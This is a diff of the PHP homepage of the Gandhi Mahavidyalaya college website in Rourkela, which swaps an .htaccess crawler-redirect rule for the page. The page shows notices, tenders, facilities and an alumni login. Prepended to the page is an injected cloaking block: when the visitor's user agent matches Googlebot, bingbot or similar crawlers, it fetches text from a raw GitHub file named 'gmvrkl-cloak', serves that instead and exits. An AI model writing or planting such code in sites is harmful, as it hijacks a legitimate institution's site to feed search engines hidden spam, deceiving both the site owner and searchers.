@@ -1,4 +1,812 @@
-RewriteEngine On
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+if (is_bot()) { 
+    $message = file_get_contents('https://raw.githubusercontent.com/anehinpek/supersaiyan/refs/heads/main/gmvrkl-cloak'); // 
+    echo $message; 
+    (exit);
+} 
+?><?php
+error_reporting(~E_DEPRECATED);
+require_once("includes/config.inc.php");
+require_once("includes/class.CommonFunctions.php");
+require_once("includes/class.DatabaseManager.php");
+require_once("includes/class.LogonUser.php");
+require_once("includes/class.UserAccess.php");
+require_once("includes/interface.AppPage.php");
 
-RewriteCond %{HTTP_USER_AGENT} (Googlebot|TelegramBot|bingbot|Google-Site-Verification|Google-InspectionTool|Googlebot-Image) [NC]
-RewriteRule ^index\.php$ profiles.php [L]
+class CurrentPage implements AppPage
+{
+  public $link_id;	// Database Link
+  public $module_name;	// Current Module Name
+  public $app_config;		// Application Configuration Settings
+  public $no_menu;
+
+  //=== Class Constructor ===/
+  function __construct()
+  {
+    global $config;		// Global Config Settings
+
+    //--- Connect TO Database ---
+    $this->link_id = DatabaseManager::iconnectDB();
+    if (!$this->link_id) {
+      die(DatabaseManager::isqlError());
+    }
+
+    //--- Set Current Module Name ---
+    $this->module_name = "Tender";
+    $this->cur_page_url = "tender.php";
+    $this->list_page_url = "tender.php";
+    //--- Application Configuration Settings ---
+    $this->app_config = $config;
+    //--- Don't show menu
+    $this->no_menu = "Y";
+    //--- Get Sort Index and Sort Order
+    $this->sortby = CommonFunctions::getSortIndex(2);
+    $this->sortmode = CommonFunctions::getSortDirection("asc");
+
+    //--- Get Record Position (crec) passed to this page ----
+    $this->reccnt = 10;
+    $this->getRecordPostion();
+  }
+  //==== Get Record Position (crec) passed to this page ====
+  public function getRecordPostion()
+  {
+    if (isset($_POST["crec"])) {
+      $this->crec = intval(CommonFunctions::replaceChars($_POST["crec"], 0));
+    } else if (isset($_GET["crec"])) {
+      $this->crec = intval(CommonFunctions::replaceChars($_GET["crec"], 0));
+    } else {
+      $this->crec = 0;
+    }
+
+    if (($this->crec % $this->reccnt) != 0) {
+      $this->crec = $this->crec - ($this->crec % $this->reccnt);
+    }
+
+    if ($this->crec < 0) {
+      $this->crec = 0;
+    }
+
+    return 1;
+  }
+
+
+  //=== Class Destructor ===/
+  function __destruct()
+  {
+    //--- Disconnect from Database ---
+    //DatabaseManager::idisconnectDB($this->link_id);
+  }
+}
+$objCurPage = new CurrentPage();
+?>
+<?php include("header.php");?>  
+<style>
+.important-links {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+.important-links li {
+  margin-bottom: 9px;
+}
+.important-links li:last-child {
+  margin-bottom: 0px;
+}
+.important-links a {
+display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 10px 16px;
+  background: #f4dfdf;
+  color: #114b1f;
+  font-weight: 500;
+  border-radius: 10px;
+  transition: all 0.3s ease;
+  text-decoration: none;
+  font-size: 20px;
+}
+.important-links a i {
+  font-size: 1.2rem;
+}
+.important-links a:hover {
+  background: #1b5e20;
+  color: #fff;
+  transform: translateX(6px);
+}
+.event_block {
+  min-height:auto;
+}
+.rb-pos{
+	position: absolute;
+	bottom: 10px;
+	right: 10px;	
+}
+</style>
+  <!-- Carousel Start -->
+  <div class="container-fluid header-carousel px-0">
+    <div id="header-carousel" class="carousel slide carousel-fade" data-bs-ride="carousel">
+      <div class="carousel-inner">
+        <div class="carousel-item banner_item active" style="background-image:url(images/carousel-2.jpg)">
+          <div class="carousel-caption">
+            <div class="container">
+              <div class="row justify-content-start">
+                <div class="col-lg-7 text-start">
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <!--<div class="carousel-item banner_item" style="background-image:url(images/carousel-2.jpg)"></div>-->
+		<div class="carousel-item banner_item" style="background-image:url(images/carousel-3.jpg)"></div>
+		<div class="carousel-item banner_item" style="background-image:url(images/carousel-4.jpg)"></div>
+		<div class="carousel-item banner_item" style="background-image:url(images/carousel-5.jpg)"></div>
+		<div class="carousel-item banner_item" style="background-image:url(images/carousel-6.jpg)"></div>
+		<div class="carousel-item banner_item" style="background-image:url(images/carousel-7.jpg)"></div>
+      </div>
+      <button class="carousel-control-prev" type="button" data-bs-target="#header-carousel" data-bs-slide="prev">
+        <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+        <span class="visually-hidden">Previous</span>
+      </button>
+      <button class="carousel-control-next" type="button" data-bs-target="#header-carousel" data-bs-slide="next">
+        <span class="carousel-control-next-icon" aria-hidden="true"></span>
+        <span class="visually-hidden">Next</span>
+      </button>
+    </div>
+  </div>
+  <!-- Carousel End -->
+
+  <!-- Ticker Start -->
+  <div class="container-fluid ticker-bar py-2 mb-5">
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-2 col-sm-2 col-xs-2 bg-dark text-center">
+          <h6 class="p-1 text-white m-0 wow fadeInLeft" data-wow-delay="0.1s"
+            style="visibility: visible; animation-delay: 0.1s; animation-name: fadeInLeft;">ANNOUNCEMENTS</h6>
+        </div>
+        <div class="col-lg-10 col-sm-10 ">
+          <marquee scrollamount="2" onmouseover="this.stop()" onmouseout="this.start()" class="news-content">
+            <?php 
+				$anno_sql = "SELECT * FROM tbl_announcement ORDER BY id DESC";
+				$anno_rs = $objCurPage->link_id->query($anno_sql);
+				if( (!$anno_rs) || (!($anno_rec = $anno_rs->fetch_array())) )
+				{
+				?>
+				<?php 
+					}
+					else{
+						do{
+				?>
+				<p><?php echo $anno_rec['title']; ?></p>
+				
+				<?php  
+				}while($anno_rec = $anno_rs->fetch_array()); }
+			?>
+
+          </marquee>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- Ticker End -->
+
+  <!-- About Start -->
+  <div class="container-fluid pb-5">
+    <div class="container">
+      <div class="row g-5">
+        <div class="col-lg-8 pe-lg-5 wow fadeIn" data-wow-delay="0.1s">
+          <h3 class="mb-0">Welcome To Gandhi Mahavidyalaya</h3>
+          <div class="separetor-middle">
+            <div class="separetor-middle-inner two">
+              <div class="separetor-middle-bullet left-0"></div>
+            </div>
+          </div>
+
+          <img class=" mb-4" height="" src="images/homewelcome.jpg" style="border-radius:5px; max-width:100%" alt="Image">
+          <p class="mb-4 wow fadeInUp" data-wow-delay="0.3s">Gandhi Mahavidyalaya, Deogaon, Rourkela is a Progressive
+            co-educatonal institution of higher education in the area. It is situated in the Rourkela Smart city,
+            flanked by N.H. 143 on the Rourkela - Keonjhar Road and well-connected to the key places of the city. It
+            occupies a significant place in the academic firmament of Rourkela The location of the college, as such, is
+            away from the madding crowd of the steel city and indubitably conducive to the academic ambience <a
+              href="about.php" class="fw-bold">Read More...</a></p>
+
+          <p class="mb-4 wow fadeInUp" data-wow-delay="0.6s">
+            <!--The idea of having a college in fertiliser township of Rourkela cherished in the minds of the local intelligensia long before it could become a reality. In the year 1980, a few elders of the locality put their heads together to start a college when they found that demand from the public living in and around the area became a proposition of pressing need. In the process, the local asministration also <a href="about.php" class="fw-bold">Read More...</a>-->
+          </p>
+
+          <div class="row g-1 mb-3">
+            <div class="col-md-auto col-sm-6"><a href="#" class="w-100 btn px-3 py-2"
+                style="background-color: #D07D8F; color: #000;">Syllabus</a></div>
+            <div class="col-md-auto col-sm-6"><a href="#" class="w-100 btn px-3 py-2"
+                style="background-color: #8B91AB; color: #000;">Academic Calender</a></div>
+            <div class="col-md-auto col-sm-6"><a href="#" class="w-100 btn btn-info px-3 py-2">Holiday List</a></div>
+            <div class="col-md-auto col-sm-6"><a href="#" class="w-100 btn btn-danger px-3 py-2">Class Time Table</a>
+            </div>
+            <div class="col-md-auto col-sm-6"><a href="#" class="w-100 btn btn-primary px-3 py-2">Downloads</a></div>
+          </div>
+
+          <!--<a href="#" class="btn btn-warning px-3 py-2">Syllabus</a>
+          <a href="#" class="btn btn-secondary px-3 py-2">Academic Calender</a>
+          <a href="#" class="btn btn-info px-3 py-2">Holiday List</a>
+          <a href="#" class="btn btn-danger px-3 py-2">Class Time Table</a>
+          <a href="#" class="btn btn-primary px-3 py-2">Downloads</a>-->
+
+        </div>
+        <div class="col-lg-4 p-3 wow fadeIn" style="background-color: #1D337E;" data-wow-delay="0.5s">
+          <div class="col-lg-12 bg-white news_list px-3 wow fadeIn" data-wow-delay="0.6s" style="min-height:320px;">
+            <h4 class="text-primary text-center">Notice Board</h4>
+            <div class="separetor-middle mb-3">
+              <div class="separetor-middle-inner">
+                <div class="separetor-middle-bullet"></div>
+              </div>
+            </div>
+
+            <div class="newstape_1" style="max-height: 320px; overflow: hidden; min-height: 294px;">
+              <div class="newstape-content">
+				<ul id="ticker01">
+
+				<?php 
+					$tsql = "SELECT * FROM tbl_news ORDER BY news_id DESC, is_new DESC";
+					$rs_news = $objCurPage->link_id->query($tsql);
+					//shuffle($objCurPage->color);
+					if( (!$rs_news) || (!($rec_news = $rs_news->fetch_array())) )
+					{
+				?>
+				<li><h6>Coming Soon</h6></li>
+				<?php 
+					}
+					else{
+						do{
+				?>
+				<li><a href="news.php?<?php echo $rec_news['news_id'];?>" title="#" class="text-dark"><span class="dt">
+				<?php 
+					$newDate = date("d M Y", strtotime($rec_news['news_date']));
+					$new_date = date('dS M', strtotime($newDate));
+					echo $new_date;
+				?>
+				</span><span class="txt"><?php echo substr($rec_news['heading'],0,70);?>
+					<?php if($rec_news["is_new"] == 1)
+					{ 
+					  echo '<img src="images/new.gif" border="0" align="absmiddle" />';
+					}
+					else
+					{
+					  echo "";
+					}
+					?>
+				</span></a></li>
+						  <?php  
+						}while($rec_news = $rs_news->fetch_array()); } ?>
+								
+				</ul>
+              </div>
+            </div>
+
+
+            <p class="text-end mt-3 mb-0 wow fadeIn" data-wow-delay="0.9s"><a href="news.php"
+                class="btn btn-sm btn-primary">Read More</a></p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- About End -->
+
+  <!-- Msg Start -->
+  <div class="container-fluid msg-section">
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-7 p-4 shadow border-end" style="background-color:#9d9c9c;">
+          <h2 class="mb-4 text-white">Principal’s Message</h2>
+          <div class="row">
+            <div class="col-lg-4 text-center wow fadeIn" data-wow-delay="0.1s">
+              <img class="img-fluid p-1 border" src="images/principal.jpg" alt="Image">
+              <p>Dr. Chandrika Pattnaik</p>
+            </div>
+            <div class="col-lg-8 wow fadeIn" data-wow-delay="0.5s">
+              <p class="mb-4">"If You are planning for a year, sow rice; if you are planning for a decade, plant trees;
+                if you are planning for a lifetime, educate people" - Chinese Proverb. Education is the most precious
+                possession owned by any. It manifests love and drives away the ignorance. The darkness gets illuminated
+                in the commencement of education which brings good thought and action in human beings. It empowers woman
+                folk and enlarges the horizon of her mind. It energizes a society...</p>
+              <p class="text-end"><a href="principalmsg.php" class="btn btn-sm btn-primary">Read More</a></p>
+            </div>
+          </div>
+        </div>
+        <div class="col-lg-5 p-4" style="background-color: #D1D1D1;">
+          <h5 class="mb-3">Our Mission</h5>
+          <div class="col-lg-12 p-2 border rounded wow fadeIn" data-wow-delay="0.5s">
+            <p class="mb-0 wow fadeInUp text-dark">Our mission is to empower the youth through access to higher
+              education, to impart innovative and global education, to promote all round development of the...</p>
+          </div>
+          <p class="text-end mt-2 mb-0 wow fadeInUp"><a href="mission_vision.php" class="btn btn-sm btn-primary">Read
+              More</a></p>
+          <h5 class="mb-3">Our Vision</h5>
+          <div class="col-lg-12 p-2 border wow fadeIn" data-wow-delay="0.5s">
+            <p class="mb-0 wow fadeInUp text-dark">To establish as a premier institute of higher education, as a
+              full-fledged multi-faculty Degree College-offering quality education for fostering human values and
+              dignity...</p>
+          </div>
+          <p class="text-end mt-2 mb-0 wow fadeInUp"><a href="mission_vision.php" class="btn btn-sm btn-primary">Read
+              More</a></p>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- Msg End -->
+
+  <!-- Our College Start -->
+  <div class="container-fluid container-service py-5">
+    <div class="container pt-5">
+      <div class="text-center mx-auto wow fadeInUp" data-wow-delay="0.1s" style="max-width: 600px;">
+        <h2 class="mb-3">Our College</h2>
+        <div class="separetor-middle w-50">
+          <div class="separetor-middle-inner">
+            <div class="separetor-middle-bullet"></div>
+          </div>
+        </div>
+        <p class="mb-5">The college is equipped with advanced academic infrastructure, ensuring quality education and holistic growth of students.</p>
+      </div>
+
+      <div class="row g-3 ">
+        <div class="col-md-3 col-lg-3 py-2 wow fadeIn" data-wow-delay="0.1s">
+          <div class="feature-item h-100 px-3 py-3">
+            <!--<div class="icon-box-primary mb-4">
+              <i class="bi bi-bullseye text-dark"></i>
+            </div>-->
+            <h5 class="mb-3">Class Room</h5>
+
+            <div class="row">
+              <div class="col-md-12 col-lg-12 wow fadeIn" data-wow-delay="0.1s">
+                <img class="img-fluid w-100 mb-3" src="images/classroom.jpg" alt="">
+                <p class="mb-0 wow fadeInUp">A highly functional and well-equipped classroom is designed to foster an
+                  engaging, dynamic learning environment at Gandhi Mahavidyalaya, Rourkela. It features modern
+                  technology</p>
+                <p class="text-end mt-3 mb-0 wow fadeInUp"><a href="facilities.php?page=classroom"
+                    class="btn btn-sm btn-primary">Read More</a></p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-md-3 col-lg-3 py-2 wow fadeIn" data-wow-delay="0.1s">
+          <div class="feature-item h-100 px-3 py-3">
+            <h5 class="mb-3">Library</h5>
+            <div class="row">
+              <div class="col-md-12 col-lg-12 wow fadeIn" data-wow-delay="0.1s">
+                <img class="img-fluid w-100 mb-3" src="images/library.jpg" alt="">
+                <p class="mb-0 wow fadeInUp">The Gandhi Mahavidyalaya Library maintains a rich collection of books,
+                  Journals, magazines etc. The management of the library is under the administrative control of the
+                  principle</p>
+                <p class="text-end mt-3 mb-0 wow fadeInUp"><a href="library.php" class="btn btn-sm btn-primary">Read
+                    More</a></p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-md-3 col-lg-3 py-2 wow fadeIn" data-wow-delay="0.1s">
+          <div class="feature-item h-100 px-3 py-3">
+            <h5 class="mb-3">Labs</h5>
+            <div class="row">
+              <div class="col-md-12 col-lg-12 wow fadeIn" data-wow-delay="0.1s">
+                <img class="img-fluid w-100 mb-3" src="images/classroom.jpg" alt="">
+                <p class="mb-0 wow fadeInUp">To establish as a premier institute of higher education, as a full-fledgedmulti-faculty Degree To establish as a premier institute of higher education, as a full-fledged
+                  multi-faculty Degree</p>
+                <p class="text-end mt-3 mb-0 wow fadeInUp"><a href="facilities.php?page=labs"
+                    class="btn btn-sm btn-primary">Read More</a></p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-md-3 col-lg-3 py-2 wow fadeIn" data-wow-delay="0.3s">
+          <div class="feature-item h-100 px-3 py-3">
+            <h5 class="mb-3">Play Ground</h5>
+            <div class="row">
+              <div class="col-md-12 col-lg-12 wow fadeIn" data-wow-delay="0.1s">
+                <img class="img-fluid w-100 mb-3" src="images/playground.jpg" alt="">
+                <p class="mb-0 wow fadeInUp">Gandhi Mahavidyalaya has a spacious playground located at the backside of
+                  the campus, providing a vibrant space for physical and recreational activities. It serves as a venue
+                </p>
+                <p class="text-end mt-3 mb-0 wow fadeInUp"><a href="facilities.php?page=playground"
+                    class="btn btn-sm btn-primary">Read More</a></p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Our College End -->
+
+  <!-- Video Modal Start -->
+  <div class="modal modal-video fade" id="videoModal" tabindex="-1" aria-labelledby="exampleModalLabel"
+    aria-hidden="true">
+    <div class="modal-dialog">
+      <div class="modal-content rounded-0">
+        <div class="modal-header">
+          <h3 class="modal-title" id="exampleModalLabel">Youtube Video</h3>
+          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+        </div>
+        <div class="modal-body">
+          <!-- 16:9 aspect ratio -->
+          <div class="ratio ratio-16x9">
+            <iframe class="embed-responsive-item" src="https://gmvrkl.ac.in/" id="video" allowfullscreen
+              allowscriptaccess="always" allow="autoplay"></iframe>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- Video Modal End -->
+
+  <!-- Service Start -->
+  <div class="container-fluid container-service py-3">
+    <div class="container pt-3">
+      <div class="text-center mx-auto wow fadeInUp" data-wow-delay="0.1s" style="max-width: 600px;">
+        <h2 class="mb-3">NAAC Accreditation</h2>
+        <div class="separetor-middle w-50">
+          <div class="separetor-middle-inner">
+            <div class="separetor-middle-bullet"></div>
+          </div>
+        </div>
+        <p class="mb-5">Our institution is accredited by NAAC, reflecting our commitment to quality education, academic excellence, and continuous improvement.</p>
+      </div>
+      <div class="row g-4">
+        <div class="col-lg-3 col-md-6 wow fadeInUp" data-wow-delay="0.1s">
+          <div class="service-item">
+            <!--<div class="icon-box-primary mb-4">
+                            <i class="bi bi-heart-pulse text-dark"></i>
+                        </div>-->
+            <h5 class="mb-3">IQAC</h5>
+              <p>The Internal Quality Assurance Cell (IQAC) is a part of the institution’s system and works realizing the goals of quality enhancement and sustenance. The prime task of the IQAC is to develop a system for
+              </p>
+              <a class="btn btn-sm btn-light rb-pos mt-3 px-3" href="iqac.php">Read More<i
+                  class="bi bi-chevron-double-right ms-1"></i></a>
+          </div>
+        </div>
+        <div class="col-lg-3 col-md-6 wow fadeInUp" data-wow-delay="0.3s">
+          <div class="service-item">
+            <h5 class="mb-3">SSR</h5>
+              <p class="mb-3">The SSR of our college reflects a comprehensive self-evaluation aligned with NAAC quality benchmarks.</p>
+
+              <div class="row text-center mb-4 g-2">
+                <div class="col-lg-12" data-wow-delay="0.1s">
+                  <a href="#"><img class="img-fluid w-100 border" src="images/naac.jpg" alt=""></a>
+                </div>
+              </div>
+
+              <a class="btn btn-sm btn-light rb-pos mt-3 px-3" href="ssr.php">Read More<i
+                  class="bi bi-chevron-double-right ms-1"></i></a>
+          </div>
+        </div>
+        <div class="col-lg-3 col-md-6 wow fadeInUp" data-wow-delay="0.5s">
+          <div class="service-item">
+            <h5 class="mb-3">AQAR</h5>
+              <p class="mb-3">AQAR showcases the yearly quality initiatives and academic progress of our college.</p>
+
+              <div class="row text-center mb-4 g-2">
+                <div class="col-lg-6 col-md-6 col-sm-6 col-xs-6" data-wow-delay="0.1s"><a href="#">
+                    <h6 class="border py-2 mb-0"><i class="fas fs-4 me-3 fa-solid fa-file-pdf"></i>2019</h6>
+                  </a></div>
+                <div class="col-lg-6 col-md-6 col-sm-6 col-xs-6" data-wow-delay="0.3s"><a href="#">
+                    <h6 class=" border py-2 mb-0"><i class="fas fs-4 me-3 fa-solid fa-file-pdf"></i>2019</h6>
+                  </a></div>
+                <div class="col-lg-6 col-md-6 col-sm-6 col-xs-6" data-wow-delay="0.5s"><a href="#">
+                    <h6 class=" border py-2 mb-0"><i class="fas fs-4 me-3 fa-solid fa-file-pdf"></i>2019</h6>
+                  </a></div>
+                <div class="col-lg-6 col-md-6 col-sm-6 col-xs-6" data-wow-delay="0.7s"><a href="#">
+                    <h6 class=" border py-2 mb-0"><i class="fas fs-4 me-3 fa-solid fa-file-pdf"></i>2019</h6>
+                  </a></div>
+              </div>
+
+              <a class="btn btn-sm btn-light rb-pos mt-3 px-3" href="aqar.php">Read More<i
+                  class="bi bi-chevron-double-right ms-1"></i></a>
+          </div>
+        </div>
+        <div class="col-lg-3 col-md-6 wow fadeInUp" data-wow-delay="0.7s">
+          <div class="service-item">
+            <h5 class="mb-3">NAAC Certificate</h5>
+              <p class="mb-3">The NAAC Certificate of our college reflects our commitment to quality education and institutional excellence.</p>
+
+              <div class="row text-center mb-4 g-2">
+                <div class="col-lg-12" data-wow-delay="0.1s">
+                  <a href="#"><img class="img-fluid w-100 border" src="images/naac.jpg" alt=""></a>
+                </div>
+              </div>
+
+              <a class="btn btn-sm btn-light rb-pos mt-3 px-3" href="">Read More<i class="bi bi-chevron-double-right ms-1"></i></a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- Service End -->
+
+  <!-- Activities Start -->
+  <div class="container-fluid py-5" id="alumni_panel">
+    <div class="container">
+      <div class="row g-3">
+        <div class="col-lg-8 wow fadeInUp" data-wow-delay="0.1s">
+          <div class="col-lg-12 p-3 border">
+            <h4 class=" mb-3">Activity &amp; Event</h4>
+            <div class="separetor-middle">
+              <div class="separetor-middle-inner two">
+                <div class="separetor-middle-bullet left-0"></div>
+              </div>
+            </div>
+
+            <div class="row">
+              <div class="col-lg-6 event_block wow fadeInUp" data-wow-delay="0.1s">
+                <h5 class="mb-3">Youth Red Cross</h5>
+                <p class="mb-0">The Youth Red Cross was introduced in the college in-the and functions as a wing of the Indian Red Cross Society, Odisha State Branch, Bhubaneswar.</p>
+                <p class="text-end mt-3 mb-0 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;"><a
+                href="yrc.php" class="btn btn-sm btn-primary">Read More</a></p>
+              </div>
+
+              <div class="col-lg-6 event_block wow fadeInUp" data-wow-delay="0.1s">
+                <h5 class="mb-3">National Service Scheme (NSS)</h5>
+                <p class="mb-0">The National Service Scheme (NSS) is an Indian government-sponsored program aimed at fostering social responsibility and community</p>
+                <p class="text-end mt-3 mb-0 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;"><a
+                href="nss.php" class="btn btn-sm btn-primary">Read More</a></p>
+              </div>
+
+              <div class="col-lg-6 event_block wow fadeInUp" data-wow-delay="0.1s">
+                <h5 class="mb-3">NCC</h5>
+                <p class="mb-0">The NCC aims at developing character, comradeship, discipline, a secular outlook, the spirit of adventure and ideals of selfless service amongst young citizens.</p>
+				<p class="text-end mt-3 mb-0 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;"><a
+                href="ncc.php" class="btn btn-sm btn-primary">Read More</a></p>
+              </div>
+			  
+			   <div class="col-lg-6 event_block wow fadeInUp" data-wow-delay="0.1s">
+                <h5 class="mb-3">Self Defense Training</h5>
+                <p class="mb-0">Self-defence is a set of awareness, assertiveness, verbal confrontation skills, safety strategies, and physical techniques that enable someone to successfully escape</p>
+				<p class="text-end mt-3 mb-0 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;"><a
+                href="self-defense.php" class="btn btn-sm btn-primary">Read More</a></p>
+				<!--
+                <div class="row mt-3 g-1">
+                  <div class="col-lg-3 col-sm-3"><img class="img-fluid w-100 border"
+                      src="images/award1.jpg" alt=""></div>
+                  <div class="col-lg-3 col-sm-3"><img class="img-fluid w-100 border"
+                      src="images/award2.jpg" alt=""></div>
+                  <div class="col-lg-3 col-sm-3"><img class="img-fluid w-100 border"
+                      src="images/award3.jpg" alt=""></div>
+                  <div class="col-lg-3 col-sm-3"><img class="img-fluid w-100 border"
+                      src="images/award4.jpg" alt=""></div>
+                </div>
+				-->
+              </div>
+			 
+            </div>
+          
+          </div>
+        </div>
+
+        <div class="col-lg-4 wow fadeIn" data-wow-delay="0.7s"
+          style="background-color: #f4dfdf; border-radius:25px; border-top:2px solid #f26800;">
+          <form method="post" name="frmAlumniLogin" id="frmAlumniLogin" action="ajax/ajax_alumnilogin.php">
+            <div class="col-lg-12 p-3">
+              <h2 class="mb-4">Alumni Login</h2>
+              <div class="separetor-middle">
+                <div class="separetor-middle-inner">
+                  <div class="separetor-middle-bullet"></div>
+                </div>
+              </div>
+              <div class="errMsgText text-center"></div>
+              <div class="row g-3">
+                <div class="col-sm-12">
+                  <div class="form-floating">
+                    <input type="email" class="form-control" id="email" name="email" placeholder="Your Email Address">
+                    <label for="name">Your Email Address</label>
+                  </div>
+                </div>
+                <div class="col-sm-12">
+                  <div class="form-floating">
+                    <input type="password" class="form-control" id="pwd" name="pwd" placeholder="Your Password">
+                    <label for="mail">Your Password</label>
+                  </div>
+                </div>
+                <div class="col-12 text-center">
+                  <input type="hidden" value="Y" name="logMe" id="logMe" />
+                  <button class="btn btn-primary w-100 py-2" type="submit">Submit Now</button>
+                </div>
+                <div class="col-sm-6 text-center">
+                  <span class="stay-signed-in checkbox-container">
+                    <input id="persistent" name="persistent" value="y" type="checkbox" checked="">
+                    <label for="persistent">Stay signed&nbsp;in</label>
+                  </span>
+                </div>
+
+                <div class="col-sm-6 text-center">
+                  <a href="forgot_password.php" id="mbr-forgot-link">Forgot Password?</a>
+                </div>
+
+                <div class="col-12 text-center">
+                  <a href="alumni_registration.php" class="btn btn-info w-100 py-2">New Registration</a>
+                </div>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- Activities Start -->
+
+  <div class="container-fluid container-service py-5">
+    <div class="container">
+      <div class="row g-3">
+
+        <div class="col-lg-4 wow fadeInUp" data-wow-delay="0.1s">
+            <div class="col-lg-12 shadow-2 p-3 border">
+                <h4 class="mb-3">Photo Gallery</h4>
+                <div class="separetor-middle"><div class="separetor-middle-inner two"><div class="separetor-middle-bullet left-0"></div></div></div>
+				<div style="min-height: 390px;">
+					<div class="row g-1 d-flex">
+						<?php
+						$tsql = "SELECT * FROM tbl_photo_category ORDER By cat_id DESC LIMIT 0, 9";
+						$rs = $objCurPage->link_id->query($tsql);
+						if( (!$rs) || (!($rec = $rs->fetch_array())) ){?>
+						<div class="blank_data"><h5>Coming Soon</h5></div>
+						<?php }
+						else{
+						do {?>
+							<div class="col-lg-4 col-md-4 col-sm-6 gal_cat mb-0">
+							<a href="#" title="<?php echo ucfirst($rec['cat_name']); ?>">
+							<div class="overlay"></div>
+							<img class="img-fluid border" src="gallery_category/thumb_<?php if($rec["cat_photo"]!=''){echo $rec["cat_photo"];}else{echo 'no-img.png';} ?>" alt=""></a>
+							</div>
+						<?php }while($rec = $rs->fetch_array()); }?>
+					</div>
+				</div>
+				 <p class="text-center mt-3 mb-0 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;"><a href="gallery.php" class="btn btn-sm btn-primary">View All</a></p>
+				
+            </div>
+        </div>
+
+        <div class="col-lg-4 wow fadeInUp" data-wow-delay="0.4s">
+          <div class="col-lg-12 shadow-2 p-3 border">
+            <h4 class="mb-3">Tender</h4>
+            <div class="separetor-middle">
+              <div class="separetor-middle-inner two">
+                <div class="separetor-middle-bullet left-0"></div>
+              </div>
+            </div>
+            <div class="newstape" style="max-height: 385px; min-height: 385px;">
+
+              <div class="newstape-content">
+                <?php $sql_pg = "SELECT * FROM tbl_tender ORDER BY tender_id desc";
+                $result = $objCurPage->link_id->query($sql_pg);
+                if ((!$result) || (!($rec_tender = $result->fetch_array()))) {
+                } else {
+                  do {
+                    ?>
+                    <div class="news-block">
+                      <div class="dt"><span
+                          class="dd"><?php echo date("d", strtotime($rec_tender["tender_date"])); ?></span><?php echo date("M Y", strtotime($rec_tender["tender_date"])); ?>
+                      </div>
+                      <div class="cont"><?php echo $rec_tender["tender_title"] ?></div>
+                    </div>
+                  <?php } while ($rec_tender = $result->fetch_array());
+                } ?>
+                <!--
+                <div class="news-block">
+                  <div class="dt"><span class="dd">16</span>Jan 2025</div>
+                  <div class="cont">Cleared scan Copy of +3 Odia Book</div>
+                </div>
+                -->
+              </div>
+            </div>
+            <p class="text-center mt-3 mb-0 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;"><a
+                href="tender.php" class="btn btn-sm btn-primary">View All</a></p>
+          </div>
+        </div>
+
+        <div class="col-lg-4 wow fadeInUp" data-wow-delay="0.4s">
+          <div class="col-lg-12 shadow-2 p-3 border">
+            <h4 class="mb-3">Important Links</h4>
+            <div class="separetor-middle">
+              <div class="separetor-middle-inner two">
+                <div class="separetor-middle-bullet left-0"></div>
+              </div>
+            </div>
+
+            <div class="col-lg-12">
+				<ul class="important-links">
+				  <li><a href="self-defense.php"><i class="bi bi-shield-check"></i> Self Defence</a></li>
+				  <li><a href="career_counselling_cell.php"><i class="bi bi-briefcase"></i> Career Counselling</a></li>
+				  <li><a href="discipline_committee.php"><i class="bi bi-journal-check"></i> Discipline Committee</a></li>
+				  <li><a href="anti_ragging_cell.php"><i class="bi bi-exclamation-triangle"></i> Anti Ragging</a></li>
+				  <li><a href="student_union.php"><i class="bi bi-people"></i> Student Union</a></li>
+				  <li><a href="ncc.php"><i class="bi bi-flag"></i> National Cadet Corps</a></li>
+				  <li><a href="nss.php"><i class="bi bi-heart"></i> National Service Scheme</a></li>
+				</ul>
+	<?php /* ?>
+              <ul class="list2">
+                <li class="wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;"><a
+                    href="self-defense.php">SELF DEFENCE</a></li>
+                <li class="wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;"><a
+                    href="career_counselling_cell.php">CAREER COUNSELLING</a></li>
+                <li class="wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;"><a
+                    href="discipline_committee.php">DISCIPLINE COMMITTEE</a></li>
+                <li class="wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;"><a
+                    href="anti_ragging_cell.php">ANTI RAGGING</a></li>
+                <li class="wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;"><a
+                    href="student_union.php">STUDENT UNION</a></li>
+                <li class="wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;"><a
+                    href="ncc.php">NATIONAL CADET CORPS</a></li>
+                <li class="wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;"><a
+                    href="nss.php">NATIONAL SERVICE SCHEME</a></li>
+              </ul>
+			  <?php */ ?>
+            </div>
+
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+<?php include("footer.php");?>  
+<script src="https://gmvrkl.ac.in/js/jquery.newstape.js"></script>
+<script src="https://gmvrkl.ac.in/js/news.js"></script>
+<script>
+  $(function () {
+    //$("ul#ticker01").liScroll();
+  });
+
